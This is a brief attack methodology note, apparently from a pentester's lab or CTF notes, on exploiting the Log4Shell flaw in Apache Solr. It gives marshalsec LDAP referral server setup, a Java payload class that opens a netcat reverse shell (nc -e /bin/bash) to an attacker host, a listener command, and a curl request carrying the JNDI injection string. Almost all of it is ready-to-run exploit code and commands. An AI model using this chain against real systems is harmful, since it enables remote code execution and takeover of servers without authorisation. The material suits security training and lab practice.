
Install and setup:

git clone <https://github.com/mbechler/marshalsec>

cd marshalsec
sudo apt install maven -y 

mvn clean package -DskipTests 

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "[http://10.13.31.108:80/#Exploit.class](http://10.13.31.108:8000/#Exploit.class)"

python3 -m http.server 80

Next, create and compile payload: (just basic example payload:)

gedit Exploit.java

public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.13.31.108 443");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

javac Exploit.java -source 8 -target 8
or
javac Exploit.java

setup listener:
rlwrap nc -lvnp 443

Trigger payload: 
curl '<http://10.10.14.76:8983/solr/admin/cores?foo=$>\{jndi:ldap://10.13.31.108:1389/Exploit\}'

![unnamed_6726cef04d614d1c8f53aaf5559f206e](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/6.%20Web%20CVEs/Log4j/{{notename}}-202605011506.png)
